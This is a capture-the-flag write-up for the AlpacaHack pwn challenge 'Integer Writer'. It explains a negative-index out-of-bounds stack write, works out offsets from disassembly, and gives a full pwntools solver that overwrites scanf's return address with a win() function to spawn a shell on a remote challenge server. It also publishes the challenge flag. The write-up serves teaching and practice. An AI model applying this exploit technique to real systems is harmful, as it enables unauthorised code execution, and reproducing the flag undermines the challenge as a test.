---
slug: "pwn-integer-writer"
title: "Integer Writer"
competition: "Alpacahack"
category: "Pwn"
difficulty: "Hard"
date: "2026-10-31"
updated: "2026-10-31"
summary: "Negative Integer + Out Of Bounds."
tags: ["OUT OF BOUNDS","NEGATIVE INTEGER","STACK"]
status: "published"
flag: "Alpaca{D0_y0u_th1nk_th3_st4ck_gr0ws_upw4rd_0r_d0wnw4rd?}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-integer-writer"
---

# Integer Writer

> Negative Integer + Out Of Bounds.

## Recon

Let’s checksec first so we can know how to solve this.

```bash
~/ctf/alpacahack/pwn/integer-writer
❯ checksec chal                                                                 󰥔 09:14:35
[*] '/home/claritys/ctf/alpacahack/pwn/integer-writer/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We got the source code,

```c
// gcc -o chal main.c -fno-pie -no-pie
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/*
** How to get the address of `win` **

  $ nm chal | grep win
  XXXXXXXXX

This address is **fixed** across executions, because the challenge binary
`chal` is compiled with -fno-pie (i.e., without position-independent code).
*/
void win() {
    execve("/bin/sh", NULL, NULL);
}

int main(void) {
    int integers[100], pos;

    /* disable stdio buffering */
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("pos > ");
    scanf("%d", &pos);
    if (pos >= 100) {
        puts("You're a hacker!");
        return 1;
    }
    printf("val > ");
    scanf("%d", &integers[pos]);

    return 0;
}
```

From the source code, we can know that there’s a function `win`, that is our target.

## Vulnerability

As we can see in the source code, there’s a vulnerable with negative integer.

```python
    if (pos >= 100) {
        puts("You're a hacker!");
        return 1;
    }
```

Even worse, it followed up with this snippet

```python
    scanf("%d", &integers[pos]);
```

So the program have a Out Of Bounds Write vulnerability, because we can use it for overwrite something. How? because we can insert a negative input as a pos, in spite of it’s used as a array for variable named `integers`.

### Unintended:

We know, there’s a `return 0` that catches our eyes into in function `main`.

```python
return 0;
```

But unfortunately, we can’t use it for ret2win. Why? Because we have to input `106` as a decimal so we can overwrite the `RBP+8` (return address). We got `106` after we count the input allocated data place

```python
0x0000000000401277 <+130>:   mov    eax,DWORD PTR [rbp-0x1a4]
```

Then we divided by 4 (because integer needs 4 bytes each, the `pos` variable is `integer`), this is for know what index that `RBP` whereas. After that, we plus 1 so it will go for `RBP+8`.

```python
>>> 420 / 4
105.0
>>> 420 / 4 + 1
106.0
```

Not `+2` cuz the array at the second `scanf`, the second scanf place at `0x1a0`.

```python
0x00000000004012a8 <+179>:   lea    rdx,[rbp-0x1a0]
```

So we need `106` for normally `ret2win` but this challenge won’t allow us to. But it gives us an idea, we can use the `call` function.

## Exploit plan

The idea is we overwrite the return address after the `call` function. Because basically the `call` function can be defined like:

```nasm
push next_intruction_from_the_program
jmp <function_that_we_call>
```

So we have a chance to take control the return address of `call` function with this **Out Of Bounds** vulnerability.

After the `call` executed, CPU do:

```nasm
RSPnew = RSPold - 8
```

**RSP**

Menunjuk posisi paling atas stack (stack pointer) Pointing to the top of the stack

So the return address’ `scanf` is:

```nasm
RSPnew = RBP - RSPold - 8

0x00000000004011fd <+8>:     sub    rsp,0x1b0

RSPnew = RBP - 0x1B0 - 8 
RSPnew = [RBP - 0x1B8]
```

Now we count the index from the second `scanf` because its for `integers'` variable arrays.

![image.png](/assets/uploads/1a3eb32e-fdb1-4786-9adf-e7fde8b7b6a3-image.png)

From the data that we got, now we can conclude the index.

```jsx
>>> 0x1A0 - 0x1b8
-24
>>> hex(-24)
'-0x18'
>>> -24 / 4
-6.0
```

Alright, we got it. We need to input `-6` so we can overwrite the `call’s` return address (it should be next program instruction without the exploit).

Now we need to input that as a decimal and the win address as a decimal too.

![image.png](/assets/uploads/ba3eaf5d-e7e6-4258-a8a5-b046068a7224-image-1.png)

```jsx
>>> 0x00000000004011d6
4198870
```

Now we place it in the solver.

```jsx
    r.sendlineafter(b'pos > ', b'-6')
    payload = elf.sym['win']
    r.sendline(str(payload))
```

![image.png](/assets/uploads/24e81a8a-2861-4173-819d-e32f50174104-image-2.png)

Locally succeeded.

Remotely also succeeded.

![image.png](/assets/uploads/80ab0be6-4c2d-4f96-921e-413a8fb5f3cf-image.png)

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("chal_patched")

context.binary = elf
context.terminal = ["ghostty", "-e"]
# Use the portable pwndbg bundle (/usr/local/bin/pwndbg) as the gdb pwntools launches.
# It ships its own gdb+python and loads pwndbg itself, so there is no gdbinit.py to source.
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("34.170.146.252", 41202) 

def main():
    r = conn()
    r.sendlineafter(b'pos > ', b'-6')
    payload = elf.sym['win']
    r.sendline(str(payload))

    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```
